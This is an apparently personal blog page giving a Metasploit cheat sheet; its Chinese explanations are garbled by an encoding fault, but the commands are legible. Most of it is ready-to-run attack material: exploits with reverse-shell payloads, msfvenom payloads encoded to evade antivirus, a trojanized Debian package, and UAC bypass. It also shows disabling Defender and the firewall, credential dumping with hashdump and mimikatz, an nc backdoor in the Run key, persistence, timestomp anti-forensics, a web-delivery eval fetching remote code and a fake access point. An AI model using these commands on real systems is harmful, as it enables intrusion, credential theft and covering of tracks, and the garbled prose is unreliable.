
<!DOCTYPE html>
<html lang="en" class="loading">
<head>
    <meta charset="UTF-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>MSF - Journey</title>
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="google" content="notranslate" />
    <meta name="keywords" content="TriDiamond Obsidian,"> 
    <meta name="description" content="�ܹ�
Rex

�������ܿ⣬��������ճ��������������˹��ֶ�����ʵ��
����socket���ӷ��ʡ�Э��Ӧ��http��SSL��SMB��
����,"> 
    <meta name="author" content="Noah AO"> 
    <link rel="alternative" href="atom.xml" title="Journey" type="application/atom+xml"> 
    <link rel="icon" href="/img/favicon.png"> 
    
<link rel="stylesheet" href="//at.alicdn.com/t/font_1429596_nzgqgvnmkjb.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.7.2/animate.min.css">

    
<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/social-share.js/1.0.16/css/share.min.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/codemirror.min.css">

    
<link rel="stylesheet" href="//cdn.bootcss.com/codemirror/5.48.4/theme/dracula.css">

    
<link rel="stylesheet" href="/css/obsidian.css">

    
<link rel="stylesheet" href="/css/ball-atom.min.css">

    
<meta name="generator" content="Hexo 5.4.0"></head>


<body class="loading">
    <div class="loader">
        <div class="la-ball-atom la-2x">
            <div></div>
            <div></div>
            <div></div>
            <div></div>
        </div>
    </div>
    <span id="config-title" style="display:none">Journey</span>
    <div id="loader"></div>
    <div id="single">
    <div class="scrollbar gradient-bg-rev"></div>
<div id="top" style="display: block;">
    <div class="bar" style="width: 0;"></div>
    <div class="navigation animated fadeIn fast delay-1s">
        <img id="home-icon" class="icon-home" src="/img/favicon.png" alt="" data-url="http://mxe0079.github.io">
        <div id="play-icon" title="Play/Pause" class="iconfont icon-play"></div>
        <h3 class="subtitle">MSF</h3>
        <div class="social">
            <!--        <div class="like-icon">-->
            <!--            <a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
            <!--        </div>-->
            <div>
                <div class="share">
                    
                        <a href="javascript:;" class="iconfont icon-share1"></a>
                        <div class="share-component-cc" data-disabled="facebook,douban,linkedin,diandian,tencent,google"></div>
                    
                </div>
            </div>
        </div>
    </div>
</div>

    <div class="section">
        <div class=article-header-wrapper>
    <div class="article-header">
        <div class="article-cover animated fadeIn" style="
            animation-delay: 600ms;
            animation-duration: 1.2s;
            background-image: 
                radial-gradient(ellipse closest-side, rgba(0, 0, 0, 0.65), #100e17),
                url(/img/cover.jpg) ">
        </div>
        <div class="else">
            <p class="animated fadeInDown">
                
                <a href="/categories/KALI"><b>「
                    </b>KALI<b> 」</b></a>
                
                March 21, 2021
            </p>
            <h3 class="post-title animated fadeInDown"><a href="/2021/03/21/Metasploit-Framework/" title="MSF" class="">MSF</a>
            </h3>
            
            <p class="post-count animated fadeInDown">
                
                <span>
                    <b class="iconfont icon-text2"></b> <i>Words count</i>
                    24k
                </span>
                
                
                <span>
                    <b class="iconfont icon-timer__s"></b> <i>Reading time</i>
                    21 mins.
                </span>
                
                
                <span id="/2021/03/21/Metasploit-Framework/" class="leancloud_visitors" data-flag-title="MSF">
                    <b class="iconfont icon-read"></b> <i>Read count</i>
                    <span class="leancloud-visitors-count">1000000</span>
                </span>
                
                
            </p>
            
            
            <ul class="animated fadeInDown post-tags-list" itemprop="keywords"><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="animated fadeInDown post-tags-list-item"><a class="animated fadeInDown post-tags-list-link" href="/tags/metasploit-framework/" rel="tag">metasploit-framework</a></li></ul>
            
        </div>
    </div>
</div>

<div class="screen-gradient-after">
    <div class="screen-gradient-content">
        <div class="screen-gradient-content-inside">
            <div class="bold-underline-links screen-gradient-sponsor">
                <p>
                    <span class="animated fadeIn delay-1s"></span>
                </p>
            </div>
        </div>
    </div>
</div>

<div class="article">
    <div class='main'>
        <div class="content markdown animated fadeIn">
            <h1 id="�ܹ�"><a href="#�ܹ�" class="headerlink" title="�ܹ�"></a>�ܹ�</h1><ul>
<li><p>Rex</p>
<ul>
<li>�������ܿ⣬��������ճ��������������˹��ֶ�����ʵ��</li>
<li>����socket���ӷ��ʡ�Э��Ӧ��http��SSL��SMB��</li>
<li>����ת����XOR��Base64��Unicode��</li>
</ul>
</li>
<li><p>Msf::Core</p>
<ul>
<li>�ṩMsf�ĺ��Ļ���API����ܵĺ�������ʵ�ֿ�</li>
</ul>
</li>
<li><p>Msf::Base</p>
<ul>
<li>�ṩ�Ѻõ�API�ӿڣ�����ģ����õĿ�</li>
</ul>
</li>
<li><p>Plugin���</p>
<ul>
<li>���Ӻ͵����ⲿ��չ���ܺ�ϵͳ</li>
</ul>
</li>
</ul>
<p><strong>Modules</strong></p>
<ul>
<li>/usr/share/metasploit-framework/modules</li>
<li>��������ģ��<ul>
<li>Exploits������ϵͳ©�����й����Ķ�������ģ���Ӧÿһ������©���Ĺ���������������������</li>
<li>Payload���ɹ�exploit֮��������Ŀ��ϵͳִ�еĴ����ָ��<ul>
<li>shellcode �� ϵͳ���shellcode��payload��һ��</li>
<li>����payload��/usr/share/metasploit-framework/modules/payloads/</li>
<li><code>Single</code>��all-in-one</li>
<li><code>Stager</code>��Ŀ�������ڴ�����ʱ���ȴ���һ����С��payload���ڽ�������</li>
<li><code>Stages</code>������stager�������������صĺ���payload</li>
</ul>
</li>
<li>Auxiliary��ִ����Ϣ�ռ���ö�١�ָ��̽�⡢ɨ��ȹ��ܵĸ���ģ��</li>
<li>Encoders����payload���м��ܣ����AV����ģ��</li>
<li>Nops�����payload�ȶ��Լ�ά�ִ�С</li>
</ul>
</li>
</ul>
<h1 id="����ʹ��"><a href="#����ʹ��" class="headerlink" title="����ʹ��"></a>����ʹ��</h1><ul>
<li>ʹ��ǰ������msfupdate  /  apt update; apt install metasploit-framework</li>
<li>Msfcli ʹ�ýӿ�</li>
<li>Msfconsole ʹ�ýӿ�<ul>
<li><code>msfconsole -h -q -r -v</code></li>
<li><code>help / ? / help vulns</code></li>
</ul>
</li>
<li><code>banner��color��connect -h</code></li>
<li><code>show exploits / options /evasion</code></li>
<li><code>search ms10-046 / name:mysql platform:aix type:aux cve:2011</code></li>
<li><code>edit / check / back</code></li>
</ul>
<pre><code class="shell">db_status / db_rebuild_cache
db_nmap
    hosts / host 1.1.1.1 / hosts -u / hosts -c address,os_flavor -S Linux
    services -p 80 / services -c info,name -p 1-1000
    vulns / creds / loot (hashdump)
db_disconnect / db_connect
    /usr/share/metasploit-framework/config/database.yml
db_import / db_export
    db_import /root/nmap.xml
    db_export -f xml /root/bak.xml
</code></pre>
<pre><code class="shell">set / unset / setg / unsetg / save
run / exploit
jobs / kill 0
load / unload / loadpath
sessions
    session -l / -i (sehll��meterpreter��VNC)
route  # ͨ��ָ��session·������
    route add 192.168.1.15 255.255.255.0 1
irb (Framework::Version)  # �����̿����ӿڽ���
resource (msfconsol -r a.rc)  # ������Դ�ļ���.rc�ļ�����������
</code></pre>
<h1 id="Exploitg��"><a href="#Exploitg��" class="headerlink" title="Exploitģ��"></a>Exploitģ��</h1><ul>
<li><strong>Active exploit</strong></li>
</ul>
<pre><code class="shell">use exploit/windows/smb/psexec
set RHOST 192.168.1.100
set PAYLOAD windows/shell/reverse_tcp
set LHOST 192.168.1.1
set LPORT 4444
set SMBUSER user1
set SMBPASS pass1
exploit
</code></pre>
<ul>
<li><strong>Passive exploit</strong></li>
</ul>
<pre><code class="shell">use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
set URIPATH /
set PAYLOAD windows/shell/reverse_tcp
set LHOST 192.168.1.1
set LPORT 4444
exploit
</code></pre>
<p><strong>����payload</strong></p>
<ul>
<li><code>use payload/windows/shell_bind_tcp</code></li>
<li><code>generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code>  ָ��bad char���Զ�ѡ�����ģ��</li>
<li><code>show encoders / generate -e x86/nonalpha</code>  �ֶ�ָ������ģ��</li>
</ul>
<pre><code class="shell">generate -b &#39;\x00&#39; -f exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -o /root/1.exe
</code></pre>
<ul>
<li>NOP��no-operation / Next Operation�����κβ�����<ul>
<li>EIP���ص��洢NOP sled�������ַʱ�����������յ���shellcodeִ��</li>
<li><code>generate -s 14</code></li>
</ul>
</li>
</ul>
<h1 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h1><ul>
<li>�߼�����̬������չ��payload<ul>
<li>����meterpreter���������ø���©�����𹥻�</li>
<li>����͸���Խ׶�һվʽ��������</li>
</ul>
</li>
<li>��ȫ�����ڴ��DLLע��ʽpayload����д���̣�<ul>
<li>ע��Ϸ�ϵͳ���̲�����stager</li>
<li>����stager�ϴ���Ԥ����DLL������չģ���ע�루�ͻ���API��</li>
<li>����stager������socket���ӽ������ܵ�TLS/1.0ͨ������</li>
<li>����TLS������һ�����غ�����չģ�飨��������ȡ֤��</li>
</ul>
</li>
<li>�����ʹ��C���Ա�д</li>
<li>�ͻ����ṩ����ruby��ȫ����API��֧���κ����ԣ�</li>
</ul>
<pre><code class="shell">help background
run bgrun
cd ls cat pwd dir mkdir mv rm rmdir edit
lpwd lcd
clearev download
upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32
execute -f cmd.exe -i �CH
getuid getsystem getprivs getproxy getpid
hashdump  run post/windows/gather/hashdump
sysinfo ps kill migrate(Ǩ�ƽ���) reboot shutdown shell
show_mount search -f autoexec.bat
arp netstat ipconfig ifconfig route
idletime(Ŀ�����ʱ��) resource
record_mic webcam_list webcam_snap -i 1 -v false
</code></pre>
<p><strong>Meterpreter python��չ</strong></p>
<ul>
<li>���軷�����ڿͻ�������ԭ��python����</li>
</ul>
<pre><code class="shell">load python
help
python_execute &quot;print(&#39;hello&#39;)&quot;
python_execute &quot;import os; cd = os.getcwd()&quot; -r cd
python_import -f find.py
</code></pre>
<h1 id="Msfcli"><a href="#Msfcli" class="headerlink" title="Msfcli"></a>Msfcli</h1><pre><code class="shell">msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST 1.1.1.1; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 1.1.1.8; set LPORT 5555; set target 34; exploit&quot;
</code></pre>
<h1 id="MSF-��Ϣ�ռ�"><a href="#MSF-��Ϣ�ռ�" class="headerlink" title="MSF - ��Ϣ�ռ�"></a>MSF - ��Ϣ�ռ�</h1><p><strong>Nmapɨ��</strong></p>
<pre><code class="shell">db_nmap -sV 192.168.1.0/24
</code></pre>
<p><strong>Auxiliaryɨ��ģ��</strong></p>
<pre><code class="shell">set RHOSTS file:/root/target.txt
# search arp
use auxiliary/scanner/discovery/arp_sweep
# search portscan
use auxiliary/scanner/portscan/syn
# Nmap IPID idle������ipidseq����
use auxiliary/scanner/ip/ipidseq
    nmap -Pn -sI 1.1.1.1 1.1.1.2
# UDP ɨ��
use auxiliary/scanner/discovery/udp_sweep
use auxiliary/scanner/discovery/udp_probe
</code></pre>
<p><strong>������̽</strong></p>
<pre><code class="shell">use auxiliary/sniffer/psnuffle
# ֧�ִ�pcapץ���ļ�����ȡ����
# ����������dnsiff
# Ŀǰֻ֧��pop3��imap��ftp��HTTP GETЭ��
</code></pre>
<p><strong>SNMPЭ��</strong></p>
<pre><code class="shell">vi /etc/default/snmpd  # snmp�����ļ�

use auxiliary/scanner/snmp/snmp_login
use auxiliary/scanner/snmp/snmp_enum
use auxiliary/scanner/snmp/snmp_enumusers (windows)
use auxiliary/scanner/snmp/snmp_enumshares (windows)
</code></pre>
<p><strong>SMB����</strong></p>
<pre><code class="shell"># SMB�汾ɨ��
use auxiliary/scanner/smb/smb_version
# ɨ�������ܵ����ж�SMB�������ͣ��˺š����룩
use auxiliary/scanner/smb/pipe_auditor
# ɨ��ͨ��SMB�ܵ����Է��ʵ�RCERPC����
use auxiliary/scanner/smb/pipe_dcerpc_auditor
# SMB����ö�٣��˺š����룩
use auxiliary/scanner/smb/smb_enumshares
# SMB�û�ö�٣��˺š����룩
use auxiliary/scanner/smb/smb_enumusers
# SIDö�٣��˺š����룩
use auxiliary/scanner/smb/smb_lookupsid
</code></pre>
<p><strong>SSHɨ��</strong></p>
<pre><code class="shell"># SSH�汾��Ϣ
use auxiliary/scanner/ssh/ssh_version
# SSH���뱬��
use auxiliary/scanner/ssh/ssh_login
    set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
# SSH��Կ��¼
use auxiliary/scanner/ssh/ssh_login_pubkey
    set KEY_FILE id_rsa
</code></pre>
<p><strong>ϵͳ����ɨ��</strong></p>
<pre><code class="shell"># ���windows�Ѿ���װ�Ĳ���
use post/windows/gather/enum_patches
# ʧ�ܿ��Գ���Ǩ�ƽ���
</code></pre>
<p><strong>Mssql</strong></p>
<pre><code class="shell"># Mssqlɨ��˿�
# TCP 1433����̬�˿ڣ� / UDP 1434 ��ѯTCP�˿ں�
use auxiliary/scanner/mssql/mssql_ping
# ��������
use auxiliary/scanner/mssql/mssql_login
# Զ��ִ������
use auxiliary/admin/mssql/mssql_exec
</code></pre>
<p><strong>FTP</strong></p>
<pre><code class="shell"># FTP�汾ɨ��
use auxiliary/scanner/ftp/ftp_version
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/ftp/ftp_login
</code></pre>
<h1 id="MSF-����i��"><a href="#MSF-����i��" class="headerlink" title="MSF ����ɨ��"></a>MSF ����ɨ��</h1><ul>
<li>������Ϣ�ռ��������©������ģ��</li>
<li>����ⲿ©��ɨ��ϵͳ�Դ�IP��ַ�ν�������ɨ��</li>
</ul>
<pre><code class="shell"># VNC�����ƽ�
use auxiliary/scanner/vnc/vnc_login
# VNC���������
use auxiliary/scanner/vnc/vnc_none_auth
    supported��None or VNC
# VNCԶ������©��
    # ��鲻�����DoS����
use auxiliary/scanner/rdp/ms12_020_check
# �豸����
use auxiliary/scanner/ssh/juniper_backdoor
use auxiliary/scanner/ssh/fortinet_backdoor
# VMWare ESXi ���뱬��
use auxiliary/scanner/vmware/vmauthd_login
use auxiliary/scanner/vmware/vmware_enum_vms
# ����WEB APIԶ�̿��������
use auxiliary/admin/vmware/poweron_vm
</code></pre>
<p><strong>HTTP����ɨ��</strong></p>
<pre><code class="shell"># ɨ�����֤��
use auxiliary/scanner/http/cert
# ��ʾĿ¼���ļ�
use auxiliary/scanner/http/dir_listing
use auxiliary/scanner/http/files_dir
# WebDAV Unicode �����ƹ�
use auxiliary/scanner/http/dir_webdav_unicode_bypass
# Tomacat ������¼ҳ��
use auxiliary/scanner/http/tomcat_mgr_login
# ����HTTP������������֤�ƹ�
use auxiliary/scanner/http/verb_auth_bypass
# WordPress���뱬��
use auxiliary/scanner/http/wordpress_login_enum
    set TARGETURI /wordpress/wp-login.php
</code></pre>
<p><strong>WMAP WEBӦ��ɨ����</strong></p>
<ul>
<li>����SQLMAP�Ĺ�����ʽ����</li>
</ul>
<pre><code>load wmap
wmap_sites -a http://1.1.1.1
wmap_targets -t http://1.1.1.1/mutillidae/index.php
wmap_run -t
wmap_run -e
wmap_vulns -l
vulns
</code></pre>
<p><strong>Openvas</strong></p>
<pre><code class="shell"># Install openvas
apt-get install openvas openvas-scanner
gvm-setup
gvm-check-setup
gvm-start
gvm-feed-update
gvmd --user=admin --new-password=admin
# ����openvas
load openvas  
# ����nbe��ʽɨ����־
db_import openvas.nbe
# nessus
Load nessus
nessus_help
nessus_connect admin:toor@1.1.1.1
nessus_policy_list
nessus_scan_new
nessus_report_list
</code></pre>
<h1 id="�ͻ�����͸"><a href="#�ͻ�����͸" class="headerlink" title="�ͻ�����͸"></a>�ͻ�����͸</h1><ul>
<li>����payload����ƭ�ͻ���ִ�У�Linux Deb��װ����</li>
</ul>
<pre><code>apt-get --download-only install freeweep
dpkg -x freesweep_0.90-1_i386.deb free
mkdir free/DEBIAN &amp;&amp; cd free/DEBIAN
vi control
vi postinst
    #!/bin/sh
    sudo chmod 755 /usr/games/freesweep_scores &amp;&amp; /usr/games/freesweep_scores &amp; /usr/games/freesweep &amp;
msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp
LHOST=1.1.1.1 LPORT=4444 -b &quot;\x00&quot; -f elf -o /root/free/usr/games/
freesweep_scores
chmod 755 postinst
dpkg-deb --build /root/free
</code></pre>
<p><strong>����Acrobat Reader©��ִ��</strong></p>
<pre><code class="shell"># ����PDF�ļ���
exploit/windows/fileformat/adobe_utilprintf    # (Windows XP)
# ���������վ��
exploit/windows/browser/adobe_utilprintf
# Meterpreter��
use priv; run post/windows/capture/keylog_recorder
</code></pre>
<p><strong>����Flash���©��ִ��payload</strong></p>
<pre><code class="shell">use exploit/multi/browser/adobe_flash_hacking_team_uaf
use exploit/multi/browser/adobe_flash_opaque_background_uaf
use auxiliary/server/browser_autopwn2
</code></pre>
<p><strong>����IE�����©��ִ��payload</strong></p>
<pre><code class="shell">use exploit/windows/browser/ms14_064_ole_code_execution
</code></pre>
<p><strong>����JRE©��ִ��payload</strong></p>
<pre><code class="shell">use exploit/multi/browser/java_jre17_driver_manager
use exploit/multi/browser/java_jre17_jmxbean
use exploit/multi/browser/java_jre17_reflection_types
</code></pre>
<p><strong>����Android���ų���</strong></p>
<pre><code class="shell">use payload/android/meterpreter/reverse_tcp
generate -f a.apk -p android -t raw
</code></pre>
<p><strong>VBScript��Ⱦ��ʽ</strong></p>
<ul>
<li>���ú� ��Ⱦword��excel�ĵ�</li>
<li>�ƹ�ĳЩ�����ļ����ͼ��İ�ȫ����</li>
</ul>
<pre><code class="shell"># ����vbscript�ű�
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -e x86/shikata_ga_nai -f vba-exe
# Office 2007 
# ��ͼ -- �� -- ����
# Payload ��һ����VBA����
# Payload �ڶ�����ճ��word�ĵ�����
# Msf��������
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
</code></pre>
<h1 id="MSF����͸�׶�"><a href="#MSF����͸�׶�" class="headerlink" title="MSF����͸�׶�"></a>MSF����͸�׶�</h1><ul>
<li>�Ѿ����Ŀ��ϵͳ����Ȩ������ս��<ul>
<li>��Ȩ</li>
<li>��Ϣ�ռ�</li>
<li>��͸����</li>
<li>���ú���</li>
</ul>
</li>
<li>��������session����ս��</li>
</ul>
<pre><code class="shell">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=4444 -b &quot;\x00&quot; -e x86/shikata_ga_nai -f exe -o 1.exe
</code></pre>
<p><strong>��ȡsystem�˺�����</strong></p>
<pre><code class="shell">load priv
getsystem
    priv_elevate_getsystem: Operation failed: Access is denied.
</code></pre>
<p><strong>�ƹ�UAC����</strong></p>
<pre><code class="shell">use exploit/windows/local/ask
    set payload windows/meterpreter/reverse_tcp
    set session
    set filename
use exploit/windows/local/bypassuac
use exploit/windows/local/bypassuac_injection
    set session
    set payload
</code></pre>
<p><strong>����©��ֱ����ȨΪsystem</strong></p>
<pre><code class="shell">use exploit/windows/local/ms13_053_schlamperei
use exploit/windows/local/ms13_081_track_popup_menu
use exploit/windows/local/ms13_097_ie_registry_symlink
use exploit/windows/local/ppr_flatten_rec
</code></pre>
<p><strong>ͼ�λ�payload</strong></p>
<pre><code class="shell">set payload windows/vncinject/reverse_tcp
set viewonly no  # �ɲ���
</code></pre>
<p><strong>Psexecģ��֮Passthehash</strong></p>
<pre><code class="shell">use exploit/windows/smb/psexec
    set smbpass hash
# ��ǰ�ر�UAC
cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f
cmd.exe /k %windir%\System32\reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
</code></pre>
<p><strong>�رշ���ǽ</strong></p>
<pre><code class="shell"># ��Ҫ����Ա��systemȨ��
netsh advfirewall set allprofiles state on
</code></pre>
<p><strong>�ر�Windefend</strong></p>
<pre><code class="shell">net stop windefend
</code></pre>
<p><strong>Bitlocker���̼���</strong></p>
<pre><code class="shell">manage-bde -off C:
manage-bde -status C:
</code></pre>
<p><strong>�ر�DEP</strong></p>
<pre><code class="shell">bcdedit.exe /set &#123;current&#125; nx AlwaysOff
</code></pre>
<p><strong>ɱ������������</strong></p>
<pre><code>run killav
run post/windows/manage/killav
</code></pre>
<p><strong>����Զ���������</strong></p>
<pre><code class="shell">run post/windows/manage/enable_rdp
run getgui �Ce
    run getgui -u yuanfh -p pass
    run multi_console_command -rc /root/.msf4/logs/scripts/getgui/clean_up__20160824.1855.rc
</code></pre>
<p><strong>�鿴Զ������</strong></p>
<pre><code class="shell">screenshot
use espia
    screengrab
</code></pre>
<p><strong>Tokens</strong></p>
<ul>
<li>�û�ÿ�η��ʣ��˺Ű���ʱ��Token</li>
<li>������Դʱ�ύToken����������֤��������WEB Cookie</li>
<li>Delegate Token��������¼�Ự</li>
<li>Impersonate Token���ǽ�����¼�Ự</li>
<li>Delegate Token�˺�ע�����ΪImpersonate Token��Ȩ����Ȼ��Ч</li>
</ul>
<p>Incognito</p>
<ul>
<li>�������ܵ���������MSF������meterpreter��</li>
<li>���������ƽ���ȡ����HASH����ȡToken���Լ�αװ�������û�</li>
<li>�����������򻷾�����Ȩ��͸�����ϵͳ</li>
</ul>
<pre><code class="shell">load incognito
list_tokens -u
impersonate_token lab\\administrator
# ��������������Ҫgetsystem
    use exploit/windows/local/ms10_015_kitrap0d
    execute -f cmd.exe -i -t  # -t ʹ�õ�ǰ��ð��tokenִ�г���
    shell
</code></pre>
<p><strong>ע���</strong></p>
<ul>
<li>ע���������windows����ȫ�����ò�����ĳЩע������޸Ĳ�����</li>
<li>�޸ġ�����������</li>
<li>��ȡ�洢��ע����еĻ�����Ϣ</li>
<li>�ƹ��ļ��Ͳ�����ɱ</li>
</ul>
<pre><code class="shell"># ��ע�������NC���ŷ���meterpreter��
upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d &#39;C:\windows\system32\nc.exe -Ldp 444 -e cmd.exe&#39;
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
</code></pre>
<pre><code class="shell"># �򿪷���ǽ�˿ڣ�meterpreter��
execute -f cmd -i -H
netsh firewall show opmode
netsh firewall add portopening TCP 4444 &quot;test&quot; ENABLE ALL
shutdown -r -t 0
nc 1.1.1.1 4444
</code></pre>
<ul>
<li><p>����ע�����</p>
<p><a target="_blank" rel="noopener" href="https://support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart">https://support.accessdata.com/hc/en-us/articles/204448155-Registry-Quick-Find-Chart</a></p>
</li>
</ul>
<p><strong>ץ����meterpreter��</strong></p>
<pre><code class="shell">load sniffer
sniffer_interfaces
sniffer_start 1
sniffer_dump 1 1.cap
# ���ڴ��л�������洢ץ����50000��������д��Ӳ��
# ���ܹ���meterpreter���������������ʹ��SSL/TLS����

# ����
use auxiliary/sniffer/psnuffle
set PCAPFILE 1.cap
</code></pre>
<p><strong>�����ļ�</strong></p>
<pre><code class="shell">search -f *.ini
search -d c:\\documents\ and\ settings\\administrator\\desktop\\ -f *.docx
</code></pre>
<p><strong>�����ƽ�</strong></p>
<p>John the Ripper �ƽ�������</p>
<pre><code class="shell">use post/windows/gather/hashdump 
# systemȨ�޵�meterpreter
run # ���������/tmpĿ¼��
use auxiliary/analyze/jtr_crack_fast
run
</code></pre>
<p><strong>�����ۼ�</strong></p>
<ul>
<li>�ļ�ϵͳ���ʻ����ºۼ�������ȡ֤�ص��ע</li>
<li>��͸���Ժ͹���������ϣ�������ļ�ϵͳ���ʺۼ�</li>
<li>��õı��ⱻ����ȡ֤���ֵķ�������Ҫ���ļ�ϵͳ��Meterpreter�����ڴ棩</li>
<li>MACʱ�䣨Modified / Accessed / Changed��</li>
</ul>
<pre><code>ls -l --time=atime/mtime/ctime 1.txt
stat 1.txt
touch -d &quot;2 days ago&quot; 1.txt
touch -t 1501010101 1.txt
</code></pre>
<pre><code class="shell"># MACE: MFT entry
# MFT: NTFS�ļ�ϵͳ����ϵͳ�����ļ������Master File Table
# ͨ��1023�ֽڻ�2��Ӳ�����������д�Ŷ���wntry��Ϣ
# �����ļ�������Ϣ����С�����ơ�Ŀ¼λ�á�����λ�á��������ڣ�

# Timestomp (meterpreter)
timestomp -v 1.txt
timestomp -f c:\\autoexec.bat 1.txt
-b -r # ����MACʱ����Ϣ
-m / -a / -c / -e / -z
timestomp -z &quot;MM/DD/YYYY HH24:MI:SS&quot; 2.txt
</code></pre>
<p><strong>·��</strong></p>
<ul>
<li>Pivoting ���� / ��Ŧ / ֧��<ul>
<li>�����Ѿ����Ƶ�һ̨�������Ϊ���������� ����</li>
<li>�����������������������ȫ�������� �����</li>
<li><code>run autoroute -s 1.1.1.0/24</code> # ���ܷ��������ı�����Ŀ����������</li>
</ul>
</li>
<li>�Զ�·�� ��ʵ����<ul>
<li>����win7��������XP</li>
<li>ɨ��������<code>use auxiliary/scanner/portscan/tcp</code></li>
</ul>
</li>
<li>Pivoting ֮�˿�ת�� Portfwd</li>
</ul>
<pre><code class="shell"># �����Ѿ������Ƶļ��������kali�빥��Ŀ��֮��ʵ�ֶ˿�ת��
portfwd add -L LIP -l LPORT -r RIP -p RPORT
portfwd add -L 1.1.1.10 -l 445 -r 2.1.1.11 -p 3389
portfwd list / delete / flush

use exploit/windows/smb/ms08_067_netapi
    set RHOST 127.0.0.1
    set LHOST 2.1.1.10
    
use exploit/multi/handler
    set exitonsession false
</code></pre>
<p><strong>POSTģ��</strong></p>
<pre><code class="shell">run post/windows/gather/arp_scanner RHOSTS=2.1.1.0/24
run post/windows/gather/checkvm
run post/windows/gather/credentials/credential_collector
run post/windows/gather/enum_applications
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_snmp
run post/multi/recon/local_exploit_suggester
run post/windows/manage/delete_user USERNAME=yuanfh
run post/multi/gather/env
run post/multi/gather/firefox_creds
run post/multi/gather/ssh_creds
run post/multi/gather/check_malware REMOTEFILE=c:\\a.exe
</code></pre>
<p><strong>�Զ�ִ�нű�</strong></p>
<pre><code class="shell">use exploit/multi/handler
show advanced
set AutoRunScript hostsedit -e 1.1.1.1,www.baidu.com
set InitialAutoRunScript checkvm

# �Զ�ִ�� post ģ��
set InitialAutoRunScript migrate -N explorer.exe
set AutoRunScript post/windows/gather/dumplinks
</code></pre>
<p><strong>�־ú���</strong></p>
<ul>
<li>����©��ȡ�õ�meterpreter shell�������ڴ��У�����ʧЧ</li>
<li>�ظ�exploit©��������ɷ������</li>
<li>�־ú��ű�֤©���޸����Կ���Զ�̿���</li>
</ul>
<pre><code class="shell"># Meterpreter ����
run metsvc -A   # ɾ�� -r
use exploit/multi/handler
set PAYLOAD windows/metsvc_bind_tcp
set LPORT 31337
set RHOST 1.1.1.1
</code></pre>
<pre><code>run persistence -h
run persistence -X -i 10 -p 4444 -r 1.1.1.1
run persistence -U -i 20 -p 4444 -r 1.1.1.1
run persistence -S -i 20 -p 4444 -r 1.1.1.1
</code></pre>
<p><strong>MSF��չ�÷�-Mimikatz</strong></p>
<pre><code class="shell"># hashdump ʹ�ò���mimikatz����
getsystem
load mimikatz
kiwi_cmd
</code></pre>
<p><strong>PHP Shell</strong></p>
<pre><code class="shell">msfvenom -p php/meterpreter/reverse_tcp LHOST=1.1.1.1 LPORT=3333 -f raw -o a.php
# �ϴ�webվ�㣬��ִ��
</code></pre>
<p><strong>Web Delivery</strong></p>
<pre><code class="shell"># ���ô���ִ��©�����ʹ����߷�����
use exploit/multi/script/web_delivery
set target 1
php -d allow_url_fopen=true -r ��eval(file_get_contents(��http://1.1.1.1/fTYWqmu&#39;));&quot;
</code></pre>
<p><strong>RFIԶ���ļ�����</strong></p>
<pre><code class="shell">vi /etc/php5/cgi/php.ini   # php �����ļ�
    allow_url_fopen = On
    allow_url_include = On
use exploit/unix/webapp/php_include
    set RHOST 1.1.1.2
    set PATH /dvwa/vulnerabilities/fi/
    set PHPURI /?page=XXpathXX
    set HEADERS &quot;Cookie:security=low;PHPSESSID=eefcf023ba61219d4745ad7487fe81d7&quot;
    set payload php/meterpreter/reverse_tcp
    set lhost 1.1.1.1
    exploit
</code></pre>
<p><strong>����</strong></p>
<p>Karmetasploit</p>
<pre><code class="shell"># α��AP����̽���롢�ӻ����ݡ����������
wget https://www.offensive-security.com/wp-content/uploads/2015/04/karma.rc_.txt
# ��װ����������
gem install activerecord sqlite3-ruby

# �����ܹ���װ����
apt-get install isc-dhcp-server
cat /etc/dhcp/dhcpd.conf
option domain-name-servers 10.0.0.1;
default-lease-time 60;
max-lease-time 72;
ddns-update-style none;
authoritative;
log-facility local7;
subnet 10.0.0.0 netmask 255.255.255.0 &#123;
range 10.0.0.100 10.0.0.254;
option routers 10.0.0.1;
option domain-name-servers 10.0.0.1;
&#125;
    
# α��AP
airmon-ng start wlan0
airbase-ng -P -C 30 -e &quot;FREE&quot; -v wlan0mon
ifconfig at0 up 10.0.0.1 netmask 255.255.255.0
touch /var/lib/dhcp/dhcpd.leases
